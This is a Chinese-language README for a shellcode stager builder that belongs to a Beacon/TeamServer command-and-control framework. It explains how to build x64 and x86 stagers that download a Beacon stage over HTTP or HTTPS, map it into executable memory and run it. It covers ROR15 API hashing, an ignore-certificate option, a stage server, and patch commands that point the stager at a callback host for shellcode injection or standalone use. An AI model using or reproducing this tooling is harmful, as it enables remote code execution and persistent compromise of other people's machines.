# stager_shellcode

语言：中文 | [English](README.en.md)

`stager_shellcode` 用于构建 x64/x86 WinINet HTTP/HTTPS stager 模板。

stager 的职责很窄：

1. 通过 HTTP 或 HTTPS 下载 stage；
2. 分配可执行内存；
3. 分块读取 stage 到内存；
4. 跳转执行下载后的 Beacon stage。

下载的 stage 预期是已经完成 reflective stub patch 的 Beacon DLL blob。

当前模板包含：

| 架构 | 源文件 | 输出模板 |
|------|--------|----------|
| x64 | `stager_http_https.asm` | `x64\Release\stager_windows_amd64.bin` |
| x86 | `stager_http_https_x86.asm` | `x86\Release\stager_windows_32.bin` |

两个模板使用相同的设计：

- `STG2` 紧凑配置块；
- ROR15 API hash；
- `tools\patch_stager_config` 统一 patch；
- 支持 HTTP / HTTPS；
- 支持 HTTPS 忽略证书错误；
- 支持 `thread` / `process` 退出模式。

## 环境要求

### 必需环境

| 依赖 | 说明 |
|------|------|
| Visual Studio 2017 或更高版本 | 推荐 VS 2022 |
| Desktop development with C++ / 使用 C++ 的桌面开发 | 必须安装 |
| MSVC x64/x86 build tools | 用于链接 stager EXE |
| MASM | 用于编译 `.asm`，随 C++ 工作负载安装 |
| Windows 10 SDK 或 Windows 11 SDK | 用于 Windows 目标平台构建 |

### 工具环境

| 依赖 | 说明 |
|------|------|
| Go 1.21+ | 运行 `tools` 下的 patch/extract/hash 工具 |
| Python 3 | 仅 HTTPS stage server 测试时需要 |
| OpenSSL | 可选；HTTPS stage server 自动生成自签名证书时使用 |

Visual Studio Installer 建议勾选：

```text
工作负载:
  使用 C++ 的桌面开发

单个组件:
  MSVC v143 或 v142 C++ x64/x86 build tools
  Windows 10 SDK 或 Windows 11 SDK
  MASM
```

## VS 工程说明

工程文件：

```text
stager_shellcode.vcxproj
```

VS 解决方案资源管理器中，`源文件` 下应该显示：

```text
stager_http_https.asm
stager_http_https_x86.asm
```

注意：

- x64 平台只构建 `stager_http_https.asm`；
- Win32 平台只构建 `stager_http_https_x86.asm`；
- 两个 asm 文件都会显示在 VS 目录里，但非当前架构的文件会被 `ExcludedFromBuild` 排除。

## 构建

### 构建 x64 模板

```bat
build_stager_x64.bat
```

输出：

```text
x64\Release\stager_windows_amd64.exe
x64\Release\stager_windows_amd64.bin
```

### 构建 x86 模板

```bat
build_stager_x86.bat
```

输出：

```text
x86\Release\stager_windows_32.exe
x86\Release\stager_windows_32.bin
```

`.bin` 是从 `.text` 节提取出的 raw shellcode 模板，用于 shellcode 注入、`CreateThread` 等 shellcode 模式。

`.exe` 是 PE 模板，使用 `patch_stager_config` patch 后可以直接独立运行，适合本地功能验证和调试。

构建完成后，需要将 stager 模板文件部署到server：

```text
server\static\stager_templates\
├── stager_windows_amd64.bin
├── stager_windows_32.bin
├── stager_windows_amd64.exe
└── stager_windows_32.exe
```

`.bin` 和 `.exe` 模板都需要放入 TeamServer 的 `static\stager_templates` 目录：

- `.bin` 经过 TeamServer patch 后用于 shellcode 模式；
- `.exe` 经过 TeamServer patch 后可以作为独立程序运行。

`extract_text` 按 section `VirtualSize` 输出，而不是完整 `RawSize`，因此不会把 linker 对齐产生的大块空白写入最终 shellcode。

### 构建脚本注意事项

当前两个构建脚本会调用本机 Visual Studio 的 `vcvars64.bat` / `vcvars32.bat`。

如果其他机器上的 VS 安装路径不同，需要修改：

```text
build_stager_x64.bat
build_stager_x86.bat
```

里面的：

```bat
set "VCVARS=..."
```

也可以直接在 **Developer Command Prompt for VS** 中手动执行 MSBuild。

## 工具目录

```text
tools\
├── extract_text\
├── patch_stager_config\
├── rot15_hash\
└── https_stage_server\
```

### extract_text

从 PE 文件中提取指定 section，默认提取 `.text`。

示例：

```bat
go run .\tools\extract_text\main.go -in .\x64\Release\stager_windows_amd64.exe -out .\x64\Release\stager_windows_amd64.bin
```

参数：

| 参数 | 说明 |
|------|------|
| `-in` | 输入 PE 文件 |
| `-out` | 输出 raw section 文件 |
| `-section` | 要提取的 section，默认 `.text` |

### patch_stager_config

Patch stager 模板中的 `STG2` 配置块。

常用参数：

| 参数 | 说明 |
|------|------|
| `-in` | 输入 stager 模板 `.bin` 或 `.exe` |
| `-out` | 输出 patch 后的 stager |
| `-scheme http|https` | 通信协议 |
| `-https` | HTTPS 快捷开关，不要和 `-scheme` 同时使用 |
| `-ignore-cert` | 忽略常见 HTTPS 证书错误 |
| `-host` / `-callback-host` | stage server 主机 |
| `-port` | stage server 端口 |
| `-base-uri` | object path 前缀 |
| `-stage-id` | stage 标识，不能包含 `/` 或 `\` |
| `-stage-max` | 最大 stage 分配大小，支持十进制或 `0x` |
| `-chunk` | 每次读取的下载块大小 |
| `-exit-mode` | `thread` 或 `process` |

`STG2` 模板不支持自定义 User-Agent 和额外 headers：

- `-ua` 会被忽略并输出警告；
- `-headers` 会直接报错。

### rot15_hash

生成 stager 使用的 ROR15 API hash。

普通输出：

```bat
go run .\tools\rot15_hash\main.go kernel32.dll LoadLibraryA
```

生成 MASM `equ` 行：

```bat
go run .\tools\rot15_hash\main.go -equ wininet.dll InternetOpenA
```

算法：

```text
combined = Rot15(module unicode bytes, uppercase ASCII) + Rot15(function ascii)
```

x64 和 x86 stager 都使用这套 hash 算法。

### https_stage_server

用于本地 HTTPS stage 下载测试。

示例：

```powershell
python .\tools\https_stage_server\serve_https.py `
  --bind 0.0.0.0 `
  --port 9999 `
  --stage C:\tmp\Beacon_stage.bin `
  --uri /assets/stg_01a657b5b9838e731d89e7b399c32147/stage.bin
```

如果证书文件不存在，server 会尝试使用 OpenSSL 生成自签名证书。

## Patch 示例

### x64 HTTP shellcode

```bat
go run .\tools\patch_stager_config\main.go -in .\x64\Release\stager_windows_amd64.bin -out .\x64\Release\stager_http_x64.bin -scheme http -host 192.168.18.1 -port 9999 -base-uri /assets -stage-id stg_01a657b5b9838e731d89e7b399c32147 -exit-mode thread
```

### x64 HTTPS shellcode

```bat
go run .\tools\patch_stager_config\main.go -in .\x64\Release\stager_windows_amd64.bin -out .\x64\Release\stager_https_x64.bin -scheme https -ignore-cert -host 192.168.18.1 -port 9999 -base-uri /assets -stage-id stg_01a657b5b9838e731d89e7b399c32147 -exit-mode thread
```

### x86 HTTP shellcode

```bat
go run .\tools\patch_stager_config\main.go -in .\x86\Release\stager_windows_32.bin -out .\x86\Release\stager_http_x86.bin -scheme http -host 192.168.18.1 -port 9999 -base-uri /assets -stage-id stg_01a657b5b9838e731d89e7b399c32147 -exit-mode thread
```

### x86 HTTPS shellcode

```bat
go run .\tools\patch_stager_config\main.go -in .\x86\Release\stager_windows_32.bin -out .\x86\Release\stager_https_x86.bin -scheme https -ignore-cert -host 192.168.18.1 -port 9999 -base-uri /assets -stage-id stg_01a657b5b9838e731d89e7b399c32147 -exit-mode thread
```

## Patch EXE 模板并独立运行

patch 工具会在输入文件中搜索 `STG2` 配置块，所以 `.bin` 和 `.exe` 都可以作为输入。

区别是：

| 输入 | 输出 | 用途 |
|------|------|------|
| `stager_windows_amd64.bin` / `stager_windows_32.bin` | patched `.bin` | shellcode 模式 |
| `stager_windows_amd64.exe` / `stager_windows_32.exe` | patched `.exe` | 独立运行模式 |

独立运行 EXE stager 测试时建议使用：

```text
-exit-mode process
```

示例：

```bat
go run .\tools\patch_stager_config\main.go -in .\x64\Release\stager_windows_amd64.exe -out .\x64\Release\stager_http_x64.exe -scheme http -host 192.168.18.1 -port 9999 -base-uri /assets -stage-id stg_01a657b5b9838e731d89e7b399c32147 -exit-mode process
```

raw shellcode 注入或 `CreateThread` 场景通常使用：

```text
-exit-mode thread
```

## Stage URL 规则

最终请求 URL：

```text
<scheme>://<host>:<port><object_path>
```

`STG2` 模板直接保存完整 `object_path`。patcher 根据：

```text
-base-uri
-stage-id
```

生成：

```text
<base-uri>/<stage-id>/stage.bin
```

示例：

```text
http://192.168.18.1:9999/assets/stg_01a657b5b9838e731d89e7b399c32147/stage.bin
```

## 架构匹配

stager 和下载的 Beacon stage 必须架构一致：

```text
x64 stager -> x64 Beacon stage
x86 stager -> x86 Beacon stage
```

不要用 x86 stager 下载 x64 stage，也不要反过来。

## 推荐流程

```text
1. 构建 Beacon DLL
2. 对 Beacon DLL 做 reflective stub patch，得到 Beacon stage blob
3. 构建 stager 模板
4. patch stager 配置
5. 启动 stage server
6. 运行或注入 stager
```

最小命令流：

```bat
build_stager_x64.bat

go run .\tools\patch_stager_config\main.go -in .\x64\Release\stager_windows_amd64.bin -out .\x64\Release\stager_http_x64.bin -scheme http -host 192.168.18.1 -port 9999 -base-uri /assets -stage-id stg_01a657b5b9838e731d89e7b399c32147 -exit-mode thread
```
